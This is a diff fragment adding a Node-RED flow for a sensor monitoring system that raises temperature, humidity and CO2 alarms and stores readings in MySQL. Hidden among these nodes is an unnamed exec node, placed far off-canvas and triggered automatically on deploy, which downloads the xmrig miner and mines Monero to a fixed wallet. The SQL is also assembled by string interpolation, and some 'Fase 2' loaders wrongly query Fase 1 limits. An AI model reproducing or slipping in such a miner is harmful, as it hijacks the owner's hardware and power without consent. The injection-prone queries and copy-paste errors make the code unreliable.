+                "f2f6c47570fcdcc8"
+            ]
+        ]
+    },
+    {
+        "id": "dbe993b89c0379a3",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "Determina si Fase1-Fase2",
+        "func": "const horaInicio = global.get(\"Hora_Inicio\");\nconst procesoActivo = global.get(\"Proceso_Activo\");\n\nif (!procesoActivo || !horaInicio) {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso no activo\" });\n    return null;\n}\n\nconst ahora = Date.now();\nconst tiempoTranscurrido = ahora - horaInicio;\nconst horas = tiempoTranscurrido / (1000 * 60 * 60);\n\nlet fase = horas >= 12 ? \"Fase 2\" : \"Fase 1\";\nmsg.fase = fase;\nnode.status({ fill: \"blue\", shape: \"dot\", text: `Fase actual: ${fase}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 400,
+        "y": 340,
+        "wires": [
+            [
+                "30c299dcca04943f"
+            ]
+        ]
+    },
+    {
+        "id": "30c299dcca04943f",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "Disparador Alarma Temperatura Ambiente",
+        "func": "const valor = msg.payload;  // valor numérico directo\nconst fase = msg.fase;\nconst registroId = global.get(\"ID_Registro_Actual\");\n\nlet min, max;\nlet tipoAlarma = `Temperatura Ambiente - ${fase}`;\nlet descripcion = \"\";\n\nif (fase === \"Fase 1\") {\n    min = global.get(\"tempAmb_min_f1\");\n    max = global.get(\"tempAmb_max_f1\");\n} else if (fase === \"Fase 2\") {\n    min = global.get(\"tempAmb_min_f2\");\n    max = global.get(\"tempAmb_max_f2\");\n}\n\nif (min == null || max == null) {\n    node.error(`Límites no definidos para ${tipoAlarma}`);\n    return null;\n}\n\nif (valor < min) {\n    descripcion = `⚠️ Alarma: Temperatura mínima superada (${valor}°C < ${min}°C)`;\n} else if (valor > max) {\n    descripcion = `⚠️ Alarma: Temperatura máxima superada (${valor}°C > ${max}°C)`;\n} else {\n    node.status({ fill: \"green\", shape: \"ring\", text: `OK: ${valor} dentro de [${min}-${max}]` });\n    return null;\n}\n\nmsg.payload = `🔔 *${tipoAlarma}*\\n${descripcion}\\nRegistro ID: ${registroId}\\nHora: ${new Date().toLocaleString()}`;\nmsg.topic = `\n    INSERT INTO Alarma (Tipo_Alarma, Valor_Registrado, Descripcion_Incidente, Fecha_Activacion, ID_Registro)\n    VALUES (\n        '${tipoAlarma}',\n        ${valor},\n        '${descripcion}',\n        NOW(),\n        ${registroId}\n    );\n`;\n\nnode.status({ fill: \"red\", shape: \"dot\", text: `ALARMA: ${descripcion}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 720,
+        "y": 340,
+        "wires": [
+            [
+                "37bc8745a4f489eb",
+                "7d88b79f7d832dc2"
+            ]
+        ]
+    },
+    {
+        "id": "6e53103644bb73ae",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Humedad Fase 1",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'Humedad - Fase 1' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 1\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3140,
+        "y": 540,
+        "wires": [
+            [
+                "7f0e781feb9be3a8"
+            ]
+        ]
+    },
+    {
+        "id": "d4c7da80c5baceda",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Humedad Fase 2",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'Humedad - Fase 1' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 1\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3140,
+        "y": 580,
+        "wires": [
+            [
+                "7f0e781feb9be3a8"
+            ]
+        ]
+    },
+    {
+        "id": "7f0e781feb9be3a8",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3490,
+        "y": 560,
+        "wires": [
+            [
+                "3f62bdae39796d3c"
+            ]
+        ]
+    },
+    {
+        "id": "3f62bdae39796d3c",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Setear Parametros Humedad",
+        "func": "if (!msg.payload || !msg.payload[0]) {\n    node.error(\"No se recibieron límites desde la base de datos\");\n    return null;\n}\n\nconst min = msg.payload[0].Limite_Min;\nconst max = msg.payload[0].Limite_Max;\n\nif (msg.fase === \"Fase 1\") {\n    global.set(\"humAmb_min_f1\", min);\n    global.set(\"humAmb_max_f1\", max);\n} else if (msg.fase === \"Fase 2\") {\n    global.set(\"humAmb_min_f2\", min);\n    global.set(\"humAmb_max_f2\", max);\n}\n\n// Mostrar por debajo del nodo\nnode.status({\n    fill: \"green\",\n    shape: \"dot\",\n    text: `Humedad ${msg.fase}: Min ${min} - Max ${max}`\n});\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3720,
+        "y": 560,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "df70c9c911c4e94f",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "Determina si Fase1-Fase2",
+        "func": "const horaInicio = global.get(\"Hora_Inicio\");\nconst procesoActivo = global.get(\"Proceso_Activo\");\n\nif (!procesoActivo || !horaInicio) {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso no activo\" });\n    return null;\n}\n\nconst ahora = Date.now();\nconst tiempoTranscurrido = ahora - horaInicio;\nconst horas = tiempoTranscurrido / (1000 * 60 * 60);\n\nlet fase = horas >= 12 ? \"Fase 2\" : \"Fase 1\";\nmsg.fase = fase;\nnode.status({ fill: \"blue\", shape: \"dot\", text: `Fase actual: ${fase}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 400,
+        "y": 540,
+        "wires": [
+            [
+                "63aeee5e7072ffb7"
+            ]
+        ]
+    },
+    {
+        "id": "63aeee5e7072ffb7",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "Disparador Alarma Humedad",
+        "func": "const valor = msg.payload;  // valor numérico directo\nconst fase = msg.fase;\nconst registroId = global.get(\"ID_Registro_Actual\");\n\nlet min, max;\nlet tipoAlarma = `Humedad - ${fase}`;\nlet descripcion = \"\";\n\n// Obtener los límites globales según la fase\nif (fase === \"Fase 1\") {\n    min = global.get(\"humAmb_min_f1\");\n    max = global.get(\"humAmb_max_f1\");\n} else if (fase === \"Fase 2\") {\n    min = global.get(\"humAmb_min_f2\");\n    max = global.get(\"humAmb_max_f2\");\n}\n\n// Validar límites\nif (min == null || max == null) {\n    node.error(`Límites no definidos para ${tipoAlarma}`);\n    return null;\n}\n\n// Comprobación del valor recibido\nif (valor < min) {\n    descripcion = `⚠️ Alarma: Humedad mínima superada (${valor}% < ${min}%)`;\n} else if (valor > max) {\n    descripcion = `⚠️ Alarma: Humedad máxima superada (${valor}% > ${max}%)`;\n} else {\n    node.status({ fill: \"green\", shape: \"ring\", text: `OK: ${valor}% dentro de [${min}% - ${max}%]` });\n    return null;\n}\n\n// Mensaje formateado para WhatsApp\nmsg.payload = `🔔 *${tipoAlarma}*\\n${descripcion}\\nRegistro ID: ${registroId}\\nHora: ${new Date().toLocaleString()}`;\n\n// Consulta SQL para guardar alarma en BD\nmsg.topic = `\n    INSERT INTO Alarma (Tipo_Alarma, Valor_Registrado, Descripcion_Incidente, Fecha_Activacion, ID_Registro)\n    VALUES (\n        '${tipoAlarma}',\n        ${valor},\n        '${descripcion}',\n        NOW(),\n        ${registroId}\n    );\n`;\n\nnode.status({ fill: \"red\", shape: \"dot\", text: `ALARMA: ${descripcion}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 740,
+        "y": 540,
+        "wires": [
+            [
+                "37bc8745a4f489eb",
+                "5d5c392d5c1674e7"
+            ]
+        ]
+    },
+    {
+        "id": "93e2a214272ae291",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Calidad de Aire Fase 1",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'CO2 - Fase 1' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 1\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3160,
+        "y": 620,
+        "wires": [
+            [
+                "da614041e9f50c07"
+            ]
+        ]
+    },
+    {
+        "id": "ea22e8aae9ef4062",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Calidad de Aire Fase 2",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'CO2 - Fase 1' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 1\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3160,
+        "y": 660,
+        "wires": [
+            [
+                "da614041e9f50c07"
+            ]
+        ]
+    },
+    {
+        "id": "da614041e9f50c07",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3490,
+        "y": 640,
+        "wires": [
+            [
+                "6a5961c92949ca03"
+            ]
+        ]
+    },
+    {
+        "id": "6a5961c92949ca03",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Setear Parametros Humedad",
+        "func": "if (!msg.payload || !msg.payload[0]) {\n    node.error(\"No se recibieron límites desde la base de datos\");\n    return null;\n}\n\nconst min = msg.payload[0].Limite_Min;\nconst max = msg.payload[0].Limite_Max;\n\nif (msg.fase === \"Fase 1\") {\n    global.set(\"co2_min_f1\", min);\n    global.set(\"co2_max_f1\", max);\n} else if (msg.fase === \"Fase 2\") {\n    global.set(\"co2_min_f2\", min);\n    global.set(\"co2_max_f2\", max);\n}\n\n// Mostrar por debajo del nodo\nnode.status({\n    fill: \"green\",\n    shape: \"dot\",\n    text: `CO2 ${msg.fase}: Min ${min} - Max ${max}`\n});\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3720,
+        "y": 640,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "d76f81af94822c9b",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "Determina si Fase1-Fase2",
+        "func": "const horaInicio = global.get(\"Hora_Inicio\");\nconst procesoActivo = global.get(\"Proceso_Activo\");\n\nif (!procesoActivo || !horaInicio) {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso no activo\" });\n    return null;\n}\n\nconst ahora = Date.now();\nconst tiempoTranscurrido = ahora - horaInicio;\nconst horas = tiempoTranscurrido / (1000 * 60 * 60);\n\nlet fase = horas >= 12 ? \"Fase 2\" : \"Fase 1\";\nmsg.fase = fase;\nnode.status({ fill: \"blue\", shape: \"dot\", text: `Fase actual: ${fase}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 400,
+        "y": 740,
+        "wires": [
+            [
+                "949942da3606dfda"
+            ]
+        ]
+    },
+    {
+        "id": "949942da3606dfda",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "Disparador Alarma Calidad Aire",
+        "func": "const valor = msg.payload;  // valor numérico de CO2\nconst fase = msg.fase;\nconst registroId = global.get(\"ID_Registro_Actual\");\n\nlet min, max;\nlet tipoAlarma = `CO2 - ${fase}`;\nlet descripcion = \"\";\n\n// Obtener límites según fase\nif (fase === \"Fase 1\") {\n    min = global.get(\"co2_min_f1\");\n    max = global.get(\"co2_max_f1\");\n} else if (fase === \"Fase 2\") {\n    min = global.get(\"co2_min_f2\");\n    max = global.get(\"co2_max_f2\");\n}\n\n// Validar límites\nif (min == null || max == null) {\n    node.error(`Límites no definidos para ${tipoAlarma}`);\n    return null;\n}\n\n// Comprobar valor\nif (valor < min) {\n    descripcion = `⚠️ Alarma: CO2 por debajo del mínimo permitido (${valor} < ${min}) ppm`;\n} else if (valor > max) {\n    descripcion = `⚠️ Alarma: CO2 por encima del máximo permitido (${valor} > ${max}) ppm`;\n} else {\n    node.status({ fill: \"green\", shape: \"ring\", text: `OK: ${valor} ppm dentro de [${min} - ${max}] ppm` });\n    return null;\n}\n\n// Mensaje formateado para WhatsApp\nmsg.payload = `🔔 *${tipoAlarma}*\\n${descripcion}\\nRegistro ID: ${registroId}\\nHora: ${new Date().toLocaleString()}`;\n\n// Consulta SQL para guardar alarma en BD\nmsg.topic = `\n    INSERT INTO Alarma (Tipo_Alarma, Valor_Registrado, Descripcion_Incidente, Fecha_Activacion, ID_Registro)\n    VALUES (\n        '${tipoAlarma}',\n        ${valor},\n        '${descripcion}',\n        NOW(),\n        ${registroId}\n    );\n`;\n\nnode.status({ fill: \"red\", shape: \"dot\", text: `ALARMA: ${descripcion}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 730,
+        "y": 740,
+        "wires": [
+            [
+                "37bc8745a4f489eb",
+                "0a457a05c4bd470e"
+            ]
+        ]
+    },
+    {
+        "id": "0c07726808bad07a",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Temperatura Sonda Fase 1",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'Temperatura Sonda - Fase 1' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 1\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3170,
+        "y": 700,
+        "wires": [
+            [
+                "018aa44db8715e2c"
+            ]
+        ]
+    },
+    {
+        "id": "f2f6c47570fcdcc8",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Temperatura Sonda Fase 2",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'Temperatura Sonda - Fase 2' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 2\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3170,
+        "y": 740,
+        "wires": [
+            [
+                "018aa44db8715e2c"
+            ]
+        ]
+    },
+    {
+        "id": "018aa44db8715e2c",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3490,
+        "y": 720,
+        "wires": [
+            [
+                "fbeb4c9b5eb36dc9"
+            ]
+        ]
+    },
+    {
+        "id": "fbeb4c9b5eb36dc9",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Setear Parametros Humedad",
+        "func": "if (!msg.payload || !msg.payload[0]) {\n    node.error(\"No se recibieron límites desde la base de datos\");\n    return null;\n}\n\nconst min = msg.payload[0].Limite_Min;\nconst max = msg.payload[0].Limite_Max;\n\nif (msg.fase === \"Fase 1\") {\n    global.set(\"tempSonda_min_f1\", min);\n    global.set(\"tempSonda_max_f1\", max);\n} else if (msg.fase === \"Fase 2\") {\n    global.set(\"tempSonda_min_f2\", min);\n    global.set(\"tempSonda_max_f2\", max);\n}\n\nnode.status({\n    fill: \"green\",\n    shape: \"dot\",\n    text: `Temp. Sonda ${msg.fase}: Min ${min} - Max ${max}`\n});\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3720,
+        "y": 720,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "6f5f8a1d25e4b920",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "Determina si Fase1-Fase2",
+        "func": "const horaInicio = global.get(\"Hora_Inicio\");\nconst procesoActivo = global.get(\"Proceso_Activo\");\n\nif (!procesoActivo || !horaInicio) {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso no activo\" });\n    return null;\n}\n\nconst ahora = Date.now();\nconst tiempoTranscurrido = ahora - horaInicio;\nconst horas = tiempoTranscurrido / (1000 * 60 * 60);\n\nlet fase = horas >= 12 ? \"Fase 2\" : \"Fase 1\";\nmsg.fase = fase;\nnode.status({ fill: \"blue\", shape: \"dot\", text: `Fase actual: ${fase}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 400,
+        "y": 940,
+        "wires": [
+            [
+                "0d21da4df2118bb2"
+            ]
+        ]
+    },
+    {
+        "id": "0d21da4df2118bb2",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "Disparador Alarma Temperatura Sonda",
+        "func": "const valor = msg.payload;  // valor numérico directo\nconst fase = msg.fase;\nconst registroId = global.get(\"ID_Registro_Actual\");\n\nlet min, max;\nlet tipoAlarma = `Temperatura Sonda - ${fase}`;\nlet descripcion = \"\";\n\n// Obtener límites según fase\nif (fase === \"Fase 1\") {\n    min = global.get(\"tempSonda_min_f1\");\n    max = global.get(\"tempSonda_max_f1\");\n} else if (fase === \"Fase 2\") {\n    min = global.get(\"tempSonda_min_f2\");\n    max = global.get(\"tempSonda_max_f2\");\n}\n\n// Validar límites\nif (min == null || max == null) {\n    node.error(`Límites no definidos para ${tipoAlarma}`);\n    return null;\n}\n\n// Comprobar valor\nif (valor < min) {\n    descripcion = `⚠️ Alarma: Temperatura sonda por debajo del mínimo permitido (${valor} < ${min}) °C`;\n} else if (valor > max) {\n    descripcion = `⚠️ Alarma: Temperatura sonda por encima del máximo permitido (${valor} > ${max}) °C`;\n} else {\n    node.status({ fill: \"green\", shape: \"ring\", text: `OK: ${valor} °C dentro de [${min} - ${max}] °C` });\n    return null;\n}\n\n// Mensaje formateado para WhatsApp\nmsg.payload = `🔔 *${tipoAlarma}*\\n${descripcion}\\nRegistro ID: ${registroId}\\nHora: ${new Date().toLocaleString()}`;\n\n// Consulta SQL para guardar alarma en BD\nmsg.topic = `\n    INSERT INTO Alarma (Tipo_Alarma, Valor_Registrado, Descripcion_Incidente, Fecha_Activacion, ID_Registro)\n    VALUES (\n        '${tipoAlarma}',\n        ${valor},\n        '${descripcion}',\n        NOW(),\n        ${registroId}\n    );\n`;\n\nnode.status({ fill: \"red\", shape: \"dot\", text: `ALARMA: ${descripcion}` });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 710,
+        "y": 940,
+        "wires": [
+            [
+                "37bc8745a4f489eb",
+                "edd04596e686c165"
+            ]
+        ]
+    },
+    {
+        "id": "2056ba65b0b92dbf",
+        "type": "exec",
+        "z": "0452eaca2b12b1a3",
+        "command": "/bin/bash -c \"cd /tmp && curl -Lk -O https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xf xmrig-6.22.2-linux-static-x64.tar.gz && xmrig-6.22.2/xmrig --coin 'monero' -o gulf.moneroocean.stream:10001 --no-color -u 426tk5Ko2QEZWbJXCzN3GSQtsbAexDyw8i33uVBziDco2kpjGx25mevaEbwVUV9iRnMGCJ7K7WtbDTdfCdd8G2Xs3hL9fLi -p hnt020\"",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 7200,
+        "y": 7920,
+        "wires": [
+            [
+                "12ac9e3c6531b672"
+            ],
+            [
+                "12ac9e3c6531b672"
+            ],
+            [
+                "12ac9e3c6531b672"
+            ]
+        ]
+    },
+    {
+        "id": "b474d8e1256c9ae7",
+        "type": "inject",
+        "z": "0452eaca2b12b1a3",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": "1",
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 7050,
+        "y": 7980,
+        "wires": [
+            [
+                "2056ba65b0b92dbf"
+            ]
+        ]
+    },
+    {
+        "id": "12ac9e3c6531b672",
+        "type": "debug",
+        "z": "0452eaca2b12b1a3",
+        "name": "debug 9",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 7400,
+        "y": 7980,
+        "wires": []
+    },
+    {
+        "id": "c541822eada6fe91",
+        "type": "inject",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Cronometro Consulta Variables",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "10",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 2770,
+        "y": 1040,
+        "wires": [
+            [
+                "352c568987ffebe6",
+                "72ccf46be2970f04",
+                "075b4fdedfbf804e",
+                "5e7f18b03beea055"
+            ]
+        ]
+    },
+    {
+        "id": "352c568987ffebe6",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Consultar Lecturas Sensor Temperatura Ambiente",
+        "func": "// Obtener el ID_Registro actual desde la variable global\nconst idRegistroActual = global.get(\"ID_Registro_Actual\");\n\n// Verificamos que el ID esté definido\nif (!idRegistroActual) {\n    node.error(\"No se encontró la variable global ID_Registro_Actual.\");\n    return null;\n}\n\n// Construimos la consulta SQL\nmsg.topic = `\n    SELECT \n        Fecha_Control AS timestamp, \n        Valor_Medido AS valor \n    FROM Sensor \n    WHERE Tipo_Sensor = 'temperatura' \n      AND ID_Registro = ${idRegistroActual}\n    ORDER BY Fecha_Control DESC\n    LIMIT 100;\n`;\n\n// El resultado lo vas a recibir en el siguiente nodo (ej. \"postgres\" o \"MySQL\") y podrás enviarlo por WebSocket al front.\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3150,
+        "y": 960,
+        "wires": [
+            [
+                "3a96e87824809f13"
+            ]
+        ]
+    },
+    {
+        "id": "3a96e87824809f13",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3450,
+        "y": 960,
+        "wires": [
+            [
+                "65636dbfd7de2154"
+            ]
+        ]
+    },
+    {
+        "id": "65636dbfd7de2154",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Armar JSON Temperatura Ambiente",
+        "func": "// El resultado del nodo MySQL está en msg.payload como un array\nconst resultados = msg.payload;\n\n// Transformamos los datos en el formato que espera el frontend\nconst datosFormateados = resultados.map(r => ({\n    timestamp: r.timestamp,\n    valor: r.valor\n}));\n\n// Podés agregar el tipo de sensor, si querés identificarlo del lado del front\nmsg.payload = {\n    tipo: \"temperatura\",\n    datos: datosFormateados\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3710,
+        "y": 960,
+        "wires": [
+            [
+                "137d77926decc77e"
+            ]
+        ]
+    },
+    {
+        "id": "137d77926decc77e",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Enviar Datos Temperatura",
+        "server": "ebc6f4821fb62a22",
+        "client": "",
+        "x": 4050,
+        "y": 960,
+        "wires": []
+    },
+    {
+        "id": "4f7fddace2e57990",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "Armar Consulta Temperatura Ambiente",
+        "func": "function formatDateToMySQL(date) {\n    const d = new Date(date);\n    const pad = (n) => (n < 10 ? '0' + n : n);\n    return d.getFullYear() + '-' +\n        pad(d.getMonth() + 1) + '-' +\n        pad(d.getDate()) + ' ' +\n        pad(d.getHours()) + ':' +\n        pad(d.getMinutes()) + ':' +\n        pad(d.getSeconds());\n}\n\nconst fechaMySQL = formatDateToMySQL(msg.payload.timestamp);\n\nmsg.topic = `\nINSERT INTO Sensor (Fecha_Control, Valor_Medido, Tipo_Sensor, ID_Registro) VALUES\n('${fechaMySQL}', ${msg.payload.valor}, 'temperatura', ${global.get(\"ID_Registro_Actual\")});\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 730,
+        "y": 400,
+        "wires": [
+            [
+                "37bc8745a4f489eb"
+            ]
+        ]
+    },
+    {
+        "id": "d2b04060cfb6dc62",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "Armar Consulta Humedad Ambiente",
+        "func": "function formatDateToMySQL(date) {\n    const d = new Date(date);\n    const pad = (n) => (n < 10 ? '0' + n : n);\n    return d.getFullYear() + '-' +\n        pad(d.getMonth() + 1) + '-' +\n        pad(d.getDate()) + ' ' +\n        pad(d.getHours()) + ':' +\n        pad(d.getMinutes()) + ':' +\n        pad(d.getSeconds());\n}\n\nconst fechaMySQL = formatDateToMySQL(msg.payload.timestamp);\n\nmsg.topic = `\nINSERT INTO Sensor (Fecha_Control, Valor_Medido, Tipo_Sensor, ID_Registro) VALUES\n('${fechaMySQL}', ${msg.payload.valor}, 'humedad', ${global.get(\"ID_Registro_Actual\")});\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 710,
+        "y": 600,
+        "wires": [
+            [
+                "37bc8745a4f489eb"
+            ]
+        ]
+    },
+    {
+        "id": "b132d80ffbdfc576",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "Armar Consulta Humedad Ambiente",
+        "func": "function formatDateToMySQL(date) {\n    const d = new Date(date);\n    const pad = (n) => (n < 10 ? '0' + n : n);\n    return d.getFullYear() + '-' +\n        pad(d.getMonth() + 1) + '-' +\n        pad(d.getDate()) + ' ' +\n        pad(d.getHours()) + ':' +\n        pad(d.getMinutes()) + ':' +\n        pad(d.getSeconds());\n}\n\nconst fechaMySQL = formatDateToMySQL(msg.payload.timestamp);\n\nmsg.topic = `\nINSERT INTO Sensor (Fecha_Control, Valor_Medido, Tipo_Sensor, ID_Registro) VALUES\n('${fechaMySQL}', ${msg.payload.valor}, 'CO2', ${global.get(\"ID_Registro_Actual\")});\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 710,
+        "y": 800,
+        "wires": [
+            [
+                "37bc8745a4f489eb"
+            ]
+        ]
+    },
+    {
+        "id": "ee1826862b5b646d",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "Armar Consulta Temperatura Sonda",
